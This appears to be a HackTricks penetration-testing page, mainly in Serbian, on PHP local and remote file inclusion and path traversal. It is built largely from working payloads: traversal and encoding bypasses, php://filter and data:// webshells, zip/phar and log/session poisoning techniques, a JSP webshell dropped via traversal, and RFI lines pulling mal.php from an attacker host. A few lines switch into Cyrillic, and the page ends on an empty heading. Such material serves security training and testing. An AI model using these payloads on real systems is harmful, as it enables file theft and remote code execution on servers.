# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Fajl se učitava sa udaljenog servera (Najbolje: Možete napisati kod i server će ga izvršiti). U php-u je ovo **onemogućeno** po defaultu (**allow_url_include**).\
**Local File Inclusion (LFI):** Server učitava lokalni fajl.

Ranljivost se javlja kada korisnik na neki način može kontrolisati fajl koji će server učitati.

Ranjive **PHP functions**: require, require_once, include, include_once

Praktičan alat za iskorišćavanje ove ranjivosti: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE fajlovi
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Mešajući nekoliko \*nix LFI lista i dodajući više putanja napravio sam ovu:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Pokušajte takođe da zamenite `/` za `\`\
Pokušajte takođe da dodate `../../../../../`

Lista koja koristi više tehnika da pronađe fajl /etc/password (da proverite da li ranjivost postoji) može se naći [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Kombinacija različitih wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Pokušajte takođe da zamenite `/` za `\`\
Pokušajte takođe da uklonite `C:/` i dodate `../../../../../`

Lista koja koristi više tehnika da pronađe fajl /boot.ini (da proverite da li ranjivost postoji) može se naći [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Proverite LFI listu linux.

## Basic LFI and bypasses

Svi primeri su za Local File Inclusion ali se takođe mogu primeniti i na Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences uklonjene nerekurzivno
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass dodavanja dodatnih karaktera na kraj prosleđenog stringa (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ovo je **rešeno od PHP 5.4**

### **Enkodiranje**

Možete koristiti nestandardna enkodiranja kao što su double URL encode (i druga):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Iz postojeće fascikle

Možda back-end proverava putanju fascikle:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Istraživanje direktorijuma u fajl sistemu servera

Fajl sistem servera može se rekurzivno istražiti da bi se identifikovali direktorijumi, ne samo fajlovi, primenom određenih tehnika. Ovaj proces uključuje utvrđivanje dubine direktorijuma i ispitivanje postojanja određenih foldera. Ispod je detaljna metoda kako to postići:

1. **Odredite dubinu direktorijuma:** Utvrdite dubinu vašeg trenutnog direktorijuma tako što ćete uspešno dohvatiti `/etc/passwd` fajl (primenljivo ako je server zasnovan na Linuxu). Primer URL-a može biti strukturiran na sledeći način, što označava dubinu tri:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Proverite foldere:** Dodajte ime sumnjivog foldera (npr., `private`) u URL, zatim se vratite na `/etc/passwd`. Dodatni nivo direktorijuma zahteva povećanje depth-a za jedan:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tumačenje rezultata:** Odgovor servera pokazuje da li folder postoji:
- **Greška / Nema izlaza:** Folder `private` verovatno ne postoji na navedenoj lokaciji.
- **Sadržaj `/etc/passwd`:** Prisustvo foldera `private` je potvrđeno.
4. **Rekurzivno istraživanje:** Otkriveni foldere je moguće dalje ispitivati radi poddirektorijuma ili fajlova koristeći istu tehniku ili tradicionalne Local File Inclusion (LFI) metode.

Za istraživanje direktorijuma na različitim lokacijama u sistemu datoteka prilagodite payload u skladu s tim. Na primer, da proverite da li `/var/www/` sadrži direktorijum `private` (pretpostavljajući da je trenutni direktorijum na dubini od 3), koristite:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation je metoda koja se koristi za manipulaciju putanjama fajlova u web aplikacijama. Često se koristi za pristup ograničenim fajlovima zaobilaženjem određenih bezbednosnih mera koje dodaju dodatne karaktere na kraj putanja fajlova. Cilj je konstruisati putanju fajla koja, nakon izmene od strane bezbednosne mere, i dalje pokazuje na željeni fajl.

U PHP, različite reprezentacije putanje fajla mogu se smatrati ekvivalentnim zbog prirode fajl sistema. Na primer:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
- Kada su poslednja 6 karaktera `passwd`, dodavanje `/` (praveći `passwd/`) ne menja ciljani fajl.
- Slično, ako se na putanju doda `.php` (npr. `shellcode.php`), dodavanje `/.` na kraju neće promeniti fajl kojem se pristupa.

Priloženi primeri pokazuju kako koristiti path truncation da bi se pristupilo `/etc/passwd`, čestom cilju zbog osetljivog sadržaja (informacije o korisničkim nalozima):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
U ovim scenarijima, broj potrebnih traversala može biti oko 2027, ali taj broj može varirati u zavisnosti od konfiguracije servera.

- **Using Dot Segments and Additional Characters**: Sekvence traversala (`../`) u kombinaciji sa dodatnim dot segmentima i karakterima mogu se koristiti za navigaciju fajl sistemom, efikasno ignorišući dodatne stringove koje server pridodaje.
- **Determining the Required Number of Traversals**: Kroz pokušaje i greške može se utvrditi tačan broj `../` sekvenci potrebnih da se dođe do root direktorijuma i zatim do `/etc/passwd`, pri čemu se osigurava da su svi pridodati stringovi (npr. `.php`) neutralisani, a željeni put (`/etc/passwd`) ostane netaknut.
- **Starting with a Fake Directory**: Uobičajena je praksa početi putanju nepostojećim direktorijumom (npr. `a/`). Ova tehnika se koristi kao mera predostrožnosti ili da bi se ispunili zahtevi serverove logike parsiranja putanja.

Primenjujući path truncation techniques, ključno je razumeti ponašanje servera pri parsiranju putanja i strukturu fajl sistema. Svaki scenarij može zahtevati drugačiji pristup, i često je potrebno testiranje da bi se pronašla naefikasnija metoda.

**Ova ranjivost je ispravljena u PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

U php-u je ovo onemogućeno po defaultu jer je **`allow_url_include`** **Off.** Mora da bude **On** da bi radilo, i u tom slučaju možete uključiti PHP fajl sa vašeg servera i dobiti RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ako iz nekog razloga **`allow_url_include`** ima vrednost **On**, ali PHP **filtrira** pristup eksternim web-stranicama, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), možete, na primer, koristiti data protocol sa base64 da dekodirate b64 PHP kod i egt RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> U prethodnom kodu, finalni `+.txt` je dodat zato što attacker trebao string koji se završava `.txt`, pa se string završava njime i nakon b64 decode taj deo će vratiti samo junk i pravi PHP kod će biti uključen (i samim tim, executed).
>
> Još jedan primer **koji ne koristi `php://` protokol** bi bio:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Korenski element

U Pythonu, u kodu kao u ovom:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ako korisnik prosledi **apsolutnu putanju** u **`file_name`**, **prethodni put se jednostavno uklanja**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
To je očekivano ponašanje prema [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ako je komponenta apsolutna putanja, sve prethodne komponente se odbacuju i spajanje se nastavlja od apsolutne komponente.

## Java: prikaz direktorijuma

Izgleda da ako imate Path Traversal u Javi i **zahtevate direktorijum** umesto fajla, vraća se **listing direktorijuma**. Ovo se neće dešavati u drugim jezicima (koliko ja znam).

## Top 25 parametara

Evo liste top 25 parametara koji bi mogli biti ranjivi na local file inclusion (LFI) (iz [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filteri omogućavaju izvođenje osnovnih **operacija izmene nad podacima** pre nego što se oni pročitaju ili upišu. Postoji 5 kategorija filtera:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Uklanja tagove iz podataka (sve između znakova "<" i ">")
- Napomena: ovaj filter je uklonjen u modernim verzijama PHP-a
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Pretvara u drugačiji enkoding (`convert.iconv.<input_enc>.<output_enc>`). Da biste dobili **listu svih podržanih enkodinga**, pokrenite u konzoli: `iconv -l`

> [!WARNING]
> Zloupotrebom `convert.iconv.*` konverzionog filtera možete **generisati proizvoljan tekst**, što može biti korisno za upis proizvoljnog teksta ili da naterate funkciju poput include da obradi proizvoljan tekst. Za više informacija pogledajte [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
- `zlib.inflate`: Decompress the data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Zastarelo
- `mdecrypt.*` : Zastarelo
- Ostali filteri
- Pokretanjem u php `var_dump(stream_get_filters());` možete naći nekoliko **neočekivanih filtera**:
- `consumed`
- `dechunk`: reverses HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Deo "php://filter" nije osetljiv na velika/mala slova

### Korišćenje php filters kao oracle za čitanje proizvoljnih fajlova

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) predložena je tehnika za čitanje lokalnog fajla bez dobijanja izlaza nazad sa servera. Ova tehnika se zasniva na **boolean eksfiltraciji fajla (karakter po karakteru) koristeći php filters** kao oracle. Ovo zato što php filters mogu da se koriste da tekst učine dovoljno velikim da php baci izuzetak.

U originalnom postu možete naći detaljno objašnjenje tehnike, ali ovde je kratak sažetak:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- This will be used to generate a **text so big when the initial letter is guessed correctly** that php will trigger an **error**
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- Ovo, u kombinaciji sa prethodnim (i drugim filterima zavisno od pogođenog slova), će nam omogućiti da pogodimo slovo na početku teksta posmatrajući kada napravimo dovoljno transformacija da ono prestane biti heksadecimalni karakter. Ako je hex, dechunk ga neće obrisati i inicijalna bomba će prouzrokovati php grešku.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Korišćenjem drugih transformacija kao što je **rot13** na početku moguće je leak-ovati druga slova kao n, o, p, q, r (i drugi codeci se mogu koristiti da pomere druga slova u hex opseg).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.

In the post a tool to perform this automatically was also leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Ovaj wrapper omogućava pristup file descriptor-ima koje je proces otvorio. Potencijalno koristan za ekstrakciju sadržaja otvorenih fajlova:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Možete takođe koristiti **php://stdin, php://stdout and php://stderr** да приступите **file descriptors 0, 1 and 2** редом (нисам сигуран како би ово могло бити корисно у нападу)

### zip:// and rar://

Otpremite Zip или Rar fajl са PHPShell-ом унутра и приступите му.\
Да бисте могли злоупотребити rar protocol, он **мора бити посебно активиран**
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Imajte na umu da je ovaj protokol ograničen php konfiguracijama **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect mora biti aktiviran. Možete izvršavati kod koristeći ovo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Navedite payload u POST parametrima:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

`.phar` fajl se može iskoristiti za izvršavanje PHP code kada web aplikacija koristi funkcije kao što je `include` za učitavanje fajlova. Sledeći PHP code snippet prikazuje kreiranje `.phar` fajla:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Da biste kompajlirali `.phar` fajl, treba izvršiti sledeću komandu:
```bash
php --define phar.readonly=0 create_path.php
```
Pri izvršenju biće kreiran fajl naziva `test.phar`, koji bi potencijalno mogao biti iskorišćen za exploit Local File Inclusion (LFI) ranjivosti.

U slučajevima kada LFI samo čita fajl bez izvršavanja PHP koda u njemu, preko funkcija kao što su `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ili `filesize()`, može se pokušati eksploatisati ranjivost deserializacije. Ova ranjivost je povezana sa čitanjem fajlova koristeći `phar` protokol.

Za detaljno razumevanje iskorišćavanja ranjivosti deserializacije u kontekstu `.phar` fajlova, pogledajte dokument povezan ispod:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Bilo je moguće zloupotrebiti **any arbitrary file read from PHP that supports php filters** da bi se dobio RCE. Detaljan opis može se [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Veoma kratak rezime: **3 byte overflow** u PHP heap-u je iskorišćen da bi se **alter the chain of free chunks** određene veličine kako bi bilo moguće **write anything in any address**, pa je dodat hook da pozove **`system`**.\
Bilo je moguće alloc chunks specifičnih veličina zloupotrebom više php filtera.

### More protocols

Proverite više mogućih[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Upis u memoriju ili u privremeni fajl (nije sigurno kako ovo može biti korisno u file inclusion napadu)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Pristup lokalnom fajl sistemu
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Pristup HTTP(s) URL-ovima
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Pristup FTP(s) URL-ovima
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompresioni Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Pronalaženje putanja koje odgovaraju šablonu (It doesn't return nothing printable, so not really useful here)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

## LFI via PHP funkcije 'assert'

Rizik od Local File Inclusion (LFI) u PHP-u je naročito visok kada se radi sa funkcijom 'assert', koja može izvršavati kod unutar stringova. To je posebno problematično ako se ulaz koji sadrži karaktere za directory traversal kao što su ".." proverava, ali nije ispravno sanitizovan.

Na primer, PHP kod može biti dizajniran da spreči directory traversal na sledeći način:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Iako je ovo namenjeno da zaustavi traversal, ono nehotično stvara vektor za code injection. Da bi iskoristio ovo za čitanje sadržaja fajla, napadač bi mogao da upotrebi:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Slično tome, za izvršavanje proizvoljnih sistemskih komandi, može se koristiti:
```plaintext
' and die(system("id")) or '
```
Važno je **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ova tehnika je relevantna u slučajevima gde vi **control** **file path** neke **PHP function** koja će **access a file**, ali nećete videti sadržaj fajla (npr. jednostavan poziv **`file()`**) jer sadržaj nije prikazan.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

Kao rezime, tehnika koristi **"UCS-4LE" encoding** da bi sadržaj fajla postao toliko **big** da će **PHP function** koja otvara fajl izazvati **error**.

Zatim, da bi se leak the first char, koristi se filter `dechunk` zajedno sa drugim kao što su **base64** ili **rot13**, i na kraju se koriste filteri `convert.iconv.UCS-4.UCS-4LE` i `convert.iconv.UTF16.UTF-16BE` da bi se postavili ostali chars na početak i leak them.

**Funkcije koje mogu biti ranjive**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Za tehničke detalje pogledajte pomenuti post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Kada server-side kod koji prima/uploaduje fajlove gradi destinacionu putanju koristeći user-controlled podatke (npr. filename ili URL) bez canonicalising i validacije, `..` segments i apsolutne putanje mogu pobjeći iz predviđenog direktorijuma i prouzrokovati arbitrary file write. Ako možete smestiti payload u direktorijum izložen webu, obično dobijate unauthenticated RCE tako što ubacite webshell.

Tipičan workflow eksploatacije:
- Identifikujte write primitive u endpointu ili background workeru koji prihvata path/filename i upisuje sadržaj na disk (npr. message-driven ingestion, XML/JSON command handlers, ZIP extractors, itd.).
- Odredite web-exposed direktorijume. Uobičajeni primeri:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Sastavite traversal putanju koja izlazi iz predviđenog storage direktorijuma u webroot i uključite sadržaj vašeg webshell-a.
- Otvorite postavljeni payload u browseru i izvršavajte komande.

Napomene:
- Vulnerable servis koji obavlja upis može slušati na non-HTTP portu (npr. JMF XML listener na TCP 4004). Glavni web portal (na drugom portu) će kasnije servirati vaš payload.
- Na Java stackovima, ovi file write-ovi su često implementirani prostom `File`/`Paths` konkatenacijom. Lack of canonicalisation/allow-listing je suštinski flaw.

Generički XML/JMF-style primer (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Mere za hardening koje onemogućavaju ovu klasu propusta:
- Rezolvirajte na kanonički put i osigurajte da je on potomak allow-listed base directory.
- Odbijajte sve putanje koje sadrže `..`, apsolutne root-ove, ili drive letters; koristite generisana imena fajlova.
- Pokrenite writer pod nalogom sa niskim privilegijama i segregirajte direktorijume za pisanje od served roots.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Putem e-pošte

**Pošaljite mejl** na interni nalog (user@localhost) koji sadrži vaš PHP payload kao `<?php echo system($_REQUEST["cmd"]); ?>` i pokušajte da izvršite include mejla korisnika koristeći put kao **`/var/mail/<USERNAME>`** ili **`/var/spool/mail/<USERNAME>`**

### Putem /proc/*/fd/*

1. Upload a lot of shells (na primer: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), gde je $PID = PID procesa (može se brute-force-ovati) i $FD = file descriptor (takođe se može brute-force-ovati)

### Putem /proc/self/environ

Slično log fajlu, pošaljite payload u User-Agent; biće reflektovano unutar fajla /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Putem otpremanja

Ako možete otpremiti fajl, jednostavno ubacite shell payload u njega (npr: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Da bi fajl ostao čitljiv najbolje je ubaciti u metapodatke slika/doc/pdf

### Putem ZIP uploada fajla

Otpremite ZIP fajl koji sadrži kompresovani PHP shell i pristupite:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Preko PHP sesija

Proverite da li sajt koristi PHP sesiju (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
U PHP-u ove sesije se čuvaju u _/var/lib/php5/sess\\_\[PHPSESSID]\_ fajlovima
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Postavite cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Iskoristi LFI da uključiš PHP session datoteku
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Preko ssh

Ako je ssh aktivan, proverite koji korisnik se koristi (/proc/self/status & /etc/passwd) i pokušajte da pristupite **\<HOME>/.ssh/id_rsa**

### **Preko** **vsftpd** _**logova**_

Logovi FTP servera vsftpd se nalaze u _**/var/log/vsftpd.log**_. U scenariju gde postoji Local File Inclusion (LFI) ranjivost i pristup izloženom vsftpd serveru je moguć, sledeći koraci se mogu razmotriti:

1. Injektujte PHP payload u polje za korisničko ime tokom procesa logovanja.
2. Nakon injekcije, iskoristite LFI da preuzmete logove servera iz _**/var/log/vsftpd.log**_.

### Preko php base64 filter (using base64)

Kao što je prikazano u [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) članku, PHP base64 filter jednostavno ignoriše non-base64. Možete to iskoristiti da zaobiđete proveru ekstenzije fajla: ako dostavite base64 koji se završava sa ".php", on će jednostavno ignorisati "." i dodati "php" base64-u. Evo primer payload-a:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Putem php filters (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) objašnjava da možete koristiti **php filters to generate arbitrary content** kao izlaz. To u suštini znači da možete **generate arbitrary php code** za include **without needing to write** u fajl.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Putem segmentation fault

**Upload** fajl koji će biti smešten kao **temporary** u `/tmp`, zatim u **isti zahtev** izazovite **segmentation fault**, i onda **temporary file won't be deleted** i možete ga potražiti.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Putem Nginx temp file storage

Ako ste pronašli **Local File Inclusion** i **Nginx** radi ispred PHP-a, možda ćete moći da dobijete RCE sledećom tehnikom:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Putem PHP_SESSION_UPLOAD_PROGRESS

Ako ste pronašli **Local File Inclusion** čak i ako **nemate session** i `session.auto_start` je `Off`. Ako u **multipart POST** podacima navedete **`PHP_SESSION_UPLOAD_PROGRESS`**, PHP će **enable the session for you**. Ovo možete zloupotrebiti da dobijete RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Putem temp file uploads in Windows

Ako ste pronašli **Local File Inclusion** i server radi na **Windows**, možda možete dobiti RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Putem `pearcmd.php` + URL args

